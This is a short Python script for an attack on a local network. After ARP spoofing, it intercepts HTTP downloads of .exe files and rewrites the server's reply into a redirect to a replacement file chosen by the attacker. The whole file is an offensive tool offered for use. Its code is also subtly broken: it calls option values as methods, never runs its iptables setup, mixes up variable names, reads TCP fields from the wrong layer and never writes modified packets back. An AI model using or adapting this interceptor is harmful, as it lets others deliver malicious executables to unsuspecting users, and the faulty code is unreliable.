#!/usr/share/python3 

import subprocess
import scapy.all as scapy
import optparse
import netfilterqueue

# This is a file interceptor (ARP SPOOF FIRST!!!!)

ack_list = []

def get_arguements():

    parser = optparse.OptionParser()
    parser.add_option("-r", "--replace", help="To specify the the replace download link", dest="replace_link")
    parser.add_option("-l", "--local", help="To specify if the attack is to be tested locally on this system", dest="local_test")
    
    (options, arguements) = parser.parse_args()

    if not options.replace():
        parser.error("[-] Please specify the download link of the replaced file")
    
    if options.local_test():
        local = "true"
    
    return options

def iptables(local):

    if local == "true":
        subprocess.call(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', '0'])
        subprocess.call(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', '0'])
    else:
        subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '0'])

def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if "exe" in scapy_packet[scapy.Raw].load:
                print("[+] .exe file detected")
                ack_list.append(scapy_packet[scapy.Raw].ack)
        
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.Raw].seq in ack_list:
                print("[+] Replacing the file")
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\n\nLocation: " + replace_link
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum

    packet.accept()

try:

    options = get_arguements()
    replace_links = options.replace_link
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run() 

except KeyboardInterrupt:

    print("CTRL + C detected .... clearing IP Tables")
    subprocess.call(['iptables', '--flush'])
